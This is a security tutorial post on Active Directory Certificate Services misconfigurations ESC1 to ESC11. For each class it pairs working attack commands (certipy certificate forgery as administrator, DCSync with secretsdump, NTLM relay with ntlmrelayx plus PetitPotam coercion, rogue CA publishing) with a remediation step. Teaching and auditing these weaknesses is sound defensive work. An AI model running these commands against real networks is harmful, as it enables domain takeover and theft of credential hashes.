---
title: "ADCS Attacks: Complete Guide to ESC1–ESC11 Misconfigurations"
date: 2026-03-28 13:00:00 +0200
categories: [Security, Active Directory]
tags: [adcs, active-directory, red-team, pentest, esc1, esc2, esc3, esc4, esc5, esc6, esc7, esc8, esc9, esc10, esc11, certificates, pki]
---

Active Directory Certificate Services (ADCS) is one of the most overlooked yet powerful attack surfaces in Windows environments. A single misconfiguration can allow any authenticated user to escalate to Domain Admin in minutes — with certificates that persist for years and survive password resets.

This lecture covers all 11 ESC (Escalation) vulnerability classes discovered by SpecterOps and extended by the community.

---

## What is ADCS?

ADCS is Microsoft's PKI implementation built into Windows Server. It issues X.509 certificates used for authentication, encryption, and code signing across the enterprise.

**Why attackers love it:**
- Certificates are trusted implicitly by Active Directory
- A cert for Domain Admin = persistent Kerberos auth (even after password reset)
- Default validity: 1–2 years
- Bypasses MFA in many configurations
- Often completely unmonitored

---

## Tool Setup

```bash
# Certipy (Linux) — primary tool
pip install certipy-ad

# Find all vulnerable templates
certipy find -u user@corp.local -p Password123 -dc-ip 192.168.1.10 -vulnerable
```

```powershell
# Certify (Windows)
.\Certify.exe find /vulnerable

# Rubeus (Windows) — Pass-the-Certificate
.\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /ptt
```

---

## ESC1 — Enrollee Supplies Subject (SAN Abuse)

**The most common and dangerous.** Template allows low-privileged users to specify a Subject Alternative Name (SAN) — so you request a cert claiming to be Domain Admin.

**Conditions:**
- Low-priv enrollment rights
- `EnrolleeSuppliesSubject` flag set
- Client Authentication EKU
- No manager approval

```bash
# Find vulnerable template
certipy find -u lowpriv@corp.local -p Password123 -dc-ip 192.168.1.10 -vulnerable

# Request cert as administrator
certipy req -u lowpriv@corp.local -p Password123 \
  -ca Corp-CA -template VulnTemplate \
  -upn administrator@corp.local -dc-ip 192.168.1.10

# Authenticate and get hash
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
# → Hash: aad3b435...:8846f7ea...

# DCSync
secretsdump.py -hashes :8846f7ea... corp.local/administrator@dc01.corp.local
```

**Fix:** Remove `EnrolleeSuppliesSubject` flag from template, or enable Manager Approval.

---

## ESC2 — Any Purpose EKU

Template has **no EKU** or **Any Purpose EKU** — usable for anything including client auth and as enrollment agent certs.

```bash
certipy req -u lowpriv@corp.local -p Password123 \
  -ca Corp-CA -template AnyPurposeTemplate -dc-ip 192.168.1.10

# Use as enrollment agent → pivot to ESC3
certipy req -u lowpriv@corp.local -p Password123 \
  -ca Corp-CA -template User \
  -on-behalf-of corp\\administrator \
  -pfx lowpriv.pfx -dc-ip 192.168.1.10
```

**Fix:** Always specify explicit, minimal EKUs. Delete templates with no EKU.

---

## ESC3 — Enrollment Agent Abuse

Two-step attack: get an enrollment agent cert → use it to request certs on behalf of other users (including admins).

```bash
# Step 1: Get enrollment agent cert
certipy req -u lowpriv@corp.local -p Password123 \
  -ca Corp-CA -template EnrollmentAgentTemplate -dc-ip 192.168.1.10

# Step 2: Request cert on behalf of admin
certipy req -u lowpriv@corp.local -p Password123 \
  -ca Corp-CA -template User \
  -on-behalf-of corp\\administrator \
  -pfx lowpriv.pfx -dc-ip 192.168.1.10

certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
```

**Fix:** Enable Enrollment Agent Restrictions on CA. Restrict who can use enrollment agent templates.

---

## ESC4 — Writable Template ACL

You have **write access to the template object in AD** — modify it to introduce ESC1, exploit, restore.

```bash
# Certipy modifies, exploits, and can restore automatically
certipy template -u lowpriv@corp.local -p Password123 \
  -template WritableTemplate -save-old -dc-ip 192.168.1.10

certipy req -u lowpriv@corp.local -p Password123 \
  -ca Corp-CA -template WritableTemplate \
  -upn administrator@corp.local -dc-ip 192.168.1.10

certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10

# Restore template
certipy template -u lowpriv@corp.local -p Password123 \
  -template WritableTemplate -configuration WritableTemplate.json -dc-ip 192.168.1.10
```

**Fix:** Only Enterprise/Domain Admins should have WriteProperty on template objects.

---

## ESC5 — Writable PKI Object ACL

Write access to **NTAuthCertificates** or **CA objects** → add rogue CA → forge any certificate.

```bash
# Add rogue CA cert to NTAuth store (if you have write rights)
certutil -dspublish -f rogueCA.crt NTAuthCA

# Forge cert signed by rogue CA, then authenticate
certipy auth -pfx forged_admin.pfx -dc-ip 192.168.1.10
```

**Fix:** Only Enterprise Admins should touch NTAuthCertificates or CA objects.

---

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 CA Flag

CA-level flag that makes **ALL templates act like ESC1** — any cert request can include arbitrary SAN.

```bash
# Check if flag is set
certutil -config "CA-Server\Corp-CA" -getreg policy\EditFlags
# Look for: EDITF_ATTRIBUTESUBJECTALTNAME2

# Exploit — use any enrollable template
certipy req -u lowpriv@corp.local -p Password123 \
  -ca Corp-CA -template User \
  -upn administrator@corp.local -dc-ip 192.168.1.10
```

**Fix:**
```powershell
certutil -config "CA-Server\Corp-CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
Restart-Service certsvc
```

---

## ESC7 — CA ManageCA / ManageCertificates Rights

Low-priv user has **ManageCA** (can enable ESC6) or **ManageCertificates** (can approve own pending requests).

```bash
# ESC7-1: Enable user-specified SAN via ManageCA
certipy ca -u lowpriv@corp.local -p Password123 \
  -ca Corp-CA -enable-userspecifiedsan -dc-ip 192.168.1.10
# → Now do ESC6

# ESC7-2: Submit pending request, approve it yourself
certipy req -u lowpriv@corp.local -p Password123 \
  -ca Corp-CA -template ApprovalTemplate \
  -upn administrator@corp.local -dc-ip 192.168.1.10
# Request ID: 37 (PENDING)

certipy ca -u lowpriv@corp.local -p Password123 \
  -ca Corp-CA -issue-request 37 -dc-ip 192.168.1.10

certipy req -u lowpriv@corp.local -p Password123 \
  -ca Corp-CA -retrieve 37 -dc-ip 192.168.1.10
```

**Fix:** Audit CA ACLs. Only dedicated PKI admin accounts get ManageCA/ManageCertificates.

---

## ESC8 — NTLM Relay to ADCS HTTP

Relay NTLM auth to ADCS web enrollment (`/certsrv/`) — get a certificate **for the victim** (e.g., DC machine account).

```bash
# Set up relay targeting ADCS HTTP
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Coerce DC to authenticate (PetitPotam)
python3 PetitPotam.py attacker-ip dc01.corp.local

# Use received DC cert for DCSync
certipy auth -pfx DC01\$.pfx -dc-ip 192.168.1.10 -username DC01\$ -domain corp.local
secretsdump.py -hashes :<hash> corp.local/DC01\$@dc01.corp.local
```

**Fix:** Enable HTTPS + EPA on IIS, disable HTTP enrollment, patch PetitPotam.

---

## ESC9 — No Security Extension in Template

Template has `CT_FLAG_NO_SECURITY_EXTENSION` — no SID embedded in cert. Combined with UPN write access: change victim UPN → request cert → restore UPN → auth as target.

```bash
# Change victim UPN to admin
certipy account update -u lowpriv@corp.local -p Password123 \
  -user victimuser -upn administrator -dc-ip 192.168.1.10

# Request cert (embeds administrator UPN, no SID)
certipy req -u victimuser@corp.local -p VictimPass \
  -ca Corp-CA -template NoSecExtTemplate -dc-ip 192.168.1.10

# Restore UPN
certipy account update -u lowpriv@corp.local -p Password123 \
  -user victimuser -upn victimuser@corp.local -dc-ip 192.168.1.10

# Authenticate as administrator
certipy auth -pfx victimuser.pfx -domain corp.local -dc-ip 192.168.1.10
```

**Fix:** Remove `CT_FLAG_NO_SECURITY_EXTENSION`. Set `StrongCertificateBindingEnforcement = 2` on DCs.

---

## ESC10 — Weak Certificate Mappings (DC Registry)

DCs have `StrongCertificateBindingEnforcement = 0` (disabled) or `1` (compat mode) — certificate-to-account mapping uses UPN only, no SID verification.

```powershell
# Check DC setting
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name StrongCertificateBindingEnforcement
# 0 = Disabled (fully vulnerable), 1 = Compat, 2 = Enforced

# Fix
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name StrongCertificateBindingEnforcement -Value 2
```

Attack chain is identical to ESC9 — the weak DC mapping is what makes it possible.

---

## ESC11 — Unencrypted RPC Certificate Enrollment

CA does not enforce encrypted RPC connections (`IF_ENFORCEENCRYPTICERTREQUEST` flag not set) → NTLM relay to the **RPC enrollment interface** (always available, unlike HTTP enrollment).

```bash
# Relay to RPC interface
ntlmrelayx.py -t rpc://ca-server -rpc-mode ICPR \
  --adcs --template DomainController -smb2support

# Coerce DC
python3 PetitPotam.py attacker-ip dc01.corp.local

# Use certificate
certipy auth -pfx DC01\$.pfx -dc-ip 192.168.1.10 -username DC01\$ -domain corp.local
```

**Fix:**
```powershell
certutil -config "CA-Server\Corp-CA" -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
Restart-Service certsvc
```

---

## Summary

| ESC | Type | Min Requirement | Result |
|-----|------|----------------|--------|
| ESC1 | Template flag | Domain Users + enroll | Domain Admin |
| ESC2 | Template EKU | Domain Users + enroll | Domain Admin |
| ESC3 | Enrollment agent | Domain Users + enroll | Domain Admin |
| ESC4 | Template ACL | Write on template object | Domain Admin |
| ESC5 | PKI object ACL | Write on NTAuth/CA | Full PKI compromise |
| ESC6 | CA flag | Any enrollable template | Domain Admin |
| ESC7 | CA rights | ManageCA or ManageCerts | Domain Admin |
| ESC8 | HTTP relay | ADCS web enrollment + coercion | Domain Admin |
| ESC9 | No SID extension | Write on UPN + weak mapping | Domain Admin |
| ESC10 | Weak DC mapping | Write on UPN + weak DC config | Domain Admin |
| ESC11 | RPC relay | CA RPC + NTLM relay | Domain Admin |

---

*For the full detailed reference with all commands, detection notes, and remediation steps, see the complete document.*

*Always test only in authorized environments. These techniques are for education and authorized red team engagements.*
